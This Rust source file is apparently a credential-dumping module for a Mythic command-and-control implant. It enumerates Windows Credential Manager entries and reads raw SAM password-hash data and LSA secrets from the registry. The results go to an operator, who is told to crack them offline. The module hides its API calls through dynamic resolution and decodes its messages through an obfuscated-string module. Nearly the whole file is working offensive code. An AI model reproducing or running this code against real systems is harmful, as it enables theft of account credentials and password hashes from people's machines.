use crate::{AgentTask, mythic_error, mythic_success};
use serde::Deserialize;
use std::error::Error;

#[derive(Deserialize)]
struct CredentialsArgs {
    source: String,
}

#[cfg(target_os = "windows")]
unsafe fn wide_to_string(ptr: *const u16) -> String {
    if ptr.is_null() {
        return String::new();
    }
    let mut len = 0;
    while *ptr.offset(len) != 0 {
        len += 1;
    }
    let slice = std::slice::from_raw_parts(ptr, len as usize);
    String::from_utf16_lossy(slice)
}

#[cfg(target_os = "windows")]
unsafe fn enum_credentials() -> Result<String, String> {
    use winapi::um::wincred::*;
    use std::ptr;

    let mut count: u32 = 0;
    let mut creds: *mut PCREDENTIALW = ptr::null_mut();

    if CredEnumerateW(ptr::null(), 0, &mut count, &mut creds) == 0 {
        return Err(crate::obfstr::d(crate::obfstr::S_CRED_FAIL_ENUM));
    }

    let mut results = Vec::new();
    let cred_slice = std::slice::from_raw_parts(creds, count as usize);

    for cred_ptr in cred_slice {
        let cred = &**cred_ptr;
        let target = wide_to_string(cred.TargetName);
        let user = if !cred.UserName.is_null() {
            wide_to_string(cred.UserName)
        } else {
            String::new()
        };
        results.push(serde_json::json!({
            "target": target,
            "username": user,
            "type": cred.Type,
            "persist": cred.Persist,
        }));
    }

    CredFree(creds as *mut _);
    Ok(serde_json::to_string_pretty(&results).unwrap_or_default())
}

#[cfg(target_os = "windows")]
fn dump_vault() -> Result<String, Box<dyn Error>> {
    unsafe {
        enum_credentials().map_err(|e| e.into())
    }
}

#[cfg(target_os = "windows")]
fn dump_credman() -> Result<String, Box<dyn Error>> {
    unsafe {
        enum_credentials().map_err(|e| e.into())
    }
}

#[cfg(target_os = "windows")]
fn dump_sam() -> Result<String, Box<dyn Error>> {
    use std::ffi::CString;
    use std::ptr;

    unsafe {
        // Resolve RegOpenKeyExA from advapi32.dll
        type RegOpenKeyExAFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            *const i8,
            u32,
            u32,
            *mut *mut std::ffi::c_void,
        ) -> i32;

        type RegEnumKeyExAFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            u32,
            *mut i8,
            *mut u32,
            *mut u32,
            *mut i8,
            *mut u32,
            *mut std::ffi::c_void,
        ) -> i32;

        type RegQueryValueExAFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            *const i8,
            *mut u32,
            *mut u32,
            *mut u8,
            *mut u32,
        ) -> i32;

        type RegCloseKeyFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

        let reg_open_key_ex_a = match crate::winapi_resolve::resolve("advapi32.dll", "RegOpenKeyExA") {
            Some(ptr) => std::mem::transmute::<_, RegOpenKeyExAFn>(ptr),
            None => return Err("Failed to resolve RegOpenKeyExA".into()),
        };

        let reg_enum_key_ex_a = match crate::winapi_resolve::resolve("advapi32.dll", "RegEnumKeyExA") {
            Some(ptr) => std::mem::transmute::<_, RegEnumKeyExAFn>(ptr),
            None => return Err("Failed to resolve RegEnumKeyExA".into()),
        };

        let reg_query_value_ex_a = match crate::winapi_resolve::resolve("advapi32.dll", "RegQueryValueExA") {
            Some(ptr) => std::mem::transmute::<_, RegQueryValueExAFn>(ptr),
            None => return Err("Failed to resolve RegQueryValueExA".into()),
        };

        let reg_close_key = match crate::winapi_resolve::resolve("advapi32.dll", "RegCloseKey") {
            Some(ptr) => std::mem::transmute::<_, RegCloseKeyFn>(ptr),
            None => return Err("Failed to resolve RegCloseKey".into()),
        };

        // HKEY_LOCAL_MACHINE = 0x80000002
        let hklm = 0x80000002usize as *mut std::ffi::c_void;
        let mut h_users: *mut std::ffi::c_void = ptr::null_mut();

        // KEY_READ = 0x20019
        let sam_path = CString::new("SAM\\SAM\\Domains\\Account\\Users").unwrap();
        let result = reg_open_key_ex_a(hklm, sam_path.as_ptr(), 0, 0x20019, &mut h_users);

        if result != 0 {
            return Err(format!("{} (code: {}). Need SYSTEM privileges.",
                crate::obfstr::d(crate::obfstr::S_CRED_FAIL_ENUM), result).into());
        }

        let mut results = Vec::new();
        let mut index = 0u32;

        loop {
            let mut name_buffer = vec![0i8; 256];
            let mut name_len = 256u32;

            let enum_result = reg_enum_key_ex_a(
                h_users,
                index,
                name_buffer.as_mut_ptr(),
                &mut name_len,
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
            );

            if enum_result != 0 {
                break;
            }

            let rid_str = String::from_utf8_lossy(
                &name_buffer[..name_len as usize].iter().map(|&c| c as u8).collect::<Vec<u8>>()
            ).to_string();

            // Try to parse as RID (hex number)
            if let Ok(rid) = u32::from_str_radix(&rid_str, 16) {
                // Open the user subkey
                let mut h_user: *mut std::ffi::c_void = ptr::null_mut();
                let user_path = CString::new(format!("SAM\\SAM\\Domains\\Account\\Users\\{}", rid_str)).unwrap();

                if reg_open_key_ex_a(hklm, user_path.as_ptr(), 0, 0x20019, &mut h_user) == 0 {
                    // Try to read the "V" value which contains password hashes
                    let v_name = CString::new("V").unwrap();
                    let mut data_len = 0u32;
                    let mut data_type = 0u32;

                    // First call to get size
                    reg_query_value_ex_a(h_user, v_name.as_ptr(), ptr::null_mut(), &mut data_type, ptr::null_mut(), &mut data_len);

                    if data_len > 0 {
                        let mut data = vec![0u8; data_len as usize];
                        if reg_query_value_ex_a(h_user, v_name.as_ptr(), ptr::null_mut(), &mut data_type, data.as_mut_ptr(), &mut data_len) == 0 {
                            // Convert to hex string for operator analysis
                            let hex_data: String = data.iter().map(|b| format!("{:02x}", b)).collect();
                            results.push(serde_json::json!({
                                "rid": rid,
                                "v_data_hex": hex_data,
                                "v_data_len": data_len,
                            }));
                        }
                    }

                    reg_close_key(h_user);
                }
            }

            index += 1;
        }

        reg_close_key(h_users);

        if results.is_empty() {
            Ok("No SAM data extracted. Requires SYSTEM privileges and direct registry access.".to_string())
        } else {
            Ok(format!("SAM Data (raw encrypted hashes - use offline tools to decrypt):\n{}",
                serde_json::to_string_pretty(&results).unwrap_or_default()))
        }
    }
}

#[cfg(target_os = "windows")]
fn dump_lsa_secrets() -> Result<String, Box<dyn Error>> {
    use std::ffi::CString;
    use std::ptr;

    unsafe {
        // Resolve registry functions from advapi32.dll
        type RegOpenKeyExAFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            *const i8,
            u32,
            u32,
            *mut *mut std::ffi::c_void,
        ) -> i32;

        type RegEnumKeyExAFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            u32,
            *mut i8,
            *mut u32,
            *mut u32,
            *mut i8,
            *mut u32,
            *mut std::ffi::c_void,
        ) -> i32;

        type RegQueryValueExAFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            *const i8,
            *mut u32,
            *mut u32,
            *mut u8,
            *mut u32,
        ) -> i32;

        type RegCloseKeyFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

        let reg_open_key_ex_a = match crate::winapi_resolve::resolve("advapi32.dll", "RegOpenKeyExA") {
            Some(ptr) => std::mem::transmute::<_, RegOpenKeyExAFn>(ptr),
            None => return Err("Failed to resolve RegOpenKeyExA".into()),
        };

        let reg_enum_key_ex_a = match crate::winapi_resolve::resolve("advapi32.dll", "RegEnumKeyExA") {
            Some(ptr) => std::mem::transmute::<_, RegEnumKeyExAFn>(ptr),
            None => return Err("Failed to resolve RegEnumKeyExA".into()),
        };

        let reg_query_value_ex_a = match crate::winapi_resolve::resolve("advapi32.dll", "RegQueryValueExA") {
            Some(ptr) => std::mem::transmute::<_, RegQueryValueExAFn>(ptr),
            None => return Err("Failed to resolve RegQueryValueExA".into()),
        };

        let reg_close_key = match crate::winapi_resolve::resolve("advapi32.dll", "RegCloseKey") {
            Some(ptr) => std::mem::transmute::<_, RegCloseKeyFn>(ptr),
            None => return Err("Failed to resolve RegCloseKey".into()),
        };

        // HKEY_LOCAL_MACHINE = 0x80000002
        let hklm = 0x80000002usize as *mut std::ffi::c_void;
        let mut h_secrets: *mut std::ffi::c_void = ptr::null_mut();

        // KEY_READ = 0x20019
        let secrets_path = CString::new("SECURITY\\Policy\\Secrets").unwrap();
        let result = reg_open_key_ex_a(hklm, secrets_path.as_ptr(), 0, 0x20019, &mut h_secrets);

        if result != 0 {
            return Err(format!("{} (code: {}). Need SYSTEM privileges.",
                crate::obfstr::d(crate::obfstr::S_CRED_FAIL_LSA), result).into());
        }

        let mut results = Vec::new();
        let mut index = 0u32;

        loop {
            let mut name_buffer = vec![0i8; 256];
            let mut name_len = 256u32;

            let enum_result = reg_enum_key_ex_a(
                h_secrets,
                index,
                name_buffer.as_mut_ptr(),
                &mut name_len,
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
            );

            if enum_result != 0 {
                break;
            }

            let secret_name = String::from_utf8_lossy(
                &name_buffer[..name_len as usize].iter().map(|&c| c as u8).collect::<Vec<u8>>()
            ).to_string();

            // Open the secret subkey
            let mut h_secret: *mut std::ffi::c_void = ptr::null_mut();
            let secret_path = CString::new(format!("SECURITY\\Policy\\Secrets\\{}\\CurrVal", secret_name)).unwrap();

            if reg_open_key_ex_a(hklm, secret_path.as_ptr(), 0, 0x20019, &mut h_secret) == 0 {
                // Try to read the default value
                let mut data_len = 0u32;
                let mut data_type = 0u32;

                // First call to get size
                reg_query_value_ex_a(h_secret, ptr::null(), ptr::null_mut(), &mut data_type, ptr::null_mut(), &mut data_len);

                if data_len > 0 {
                    let mut data = vec![0u8; data_len as usize];
                    if reg_query_value_ex_a(h_secret, ptr::null(), ptr::null_mut(), &mut data_type, data.as_mut_ptr(), &mut data_len) == 0 {
                        // Convert to hex string for operator analysis
                        let hex_data: String = data.iter().map(|b| format!("{:02x}", b)).collect();
                        results.push(serde_json::json!({
                            "secret_name": secret_name,
                            "encrypted_data_hex": hex_data,
                            "data_len": data_len,
                        }));
                    }
                }

                reg_close_key(h_secret);
            }

            index += 1;
        }

        reg_close_key(h_secrets);

        if results.is_empty() {
            Ok(crate::obfstr::d(crate::obfstr::S_CRED_NO_LSA))
        } else {
            Ok(format!("LSA Secrets (raw encrypted data - use offline tools to decrypt):\n{}",
                serde_json::to_string_pretty(&results).unwrap_or_default()))
        }
    }
}

pub fn credentials_dump(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    #[cfg(not(target_os = "windows"))]
    {
        return Ok(mythic_error!(
            task.id,
            format!("Credentials dump {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))
        ));
    }

    #[cfg(target_os = "windows")]
    {
        let args: CredentialsArgs = serde_json::from_str(&task.parameters)?;

        let result = match args.source.as_str() {
            "vault" => dump_vault(),
            "credman" => dump_credman(),
            "sam" => dump_sam(),
            "lsa_secrets" => dump_lsa_secrets(),
            _ => {
                return Ok(mythic_error!(
                    task.id,
                    format!("{}: {}. {}", crate::obfstr::d(crate::obfstr::S_CRED_UNKNOWN), args.source, crate::obfstr::d(crate::obfstr::S_CRED_VALID))
                ));
            }
        };

        match result {
            Ok(output) => Ok(mythic_success!(task.id, output)),
            Err(e) => Ok(mythic_error!(task.id, format!("{}: {}", crate::obfstr::d(crate::obfstr::S_CRED_FAIL), e))),
        }
    }
}
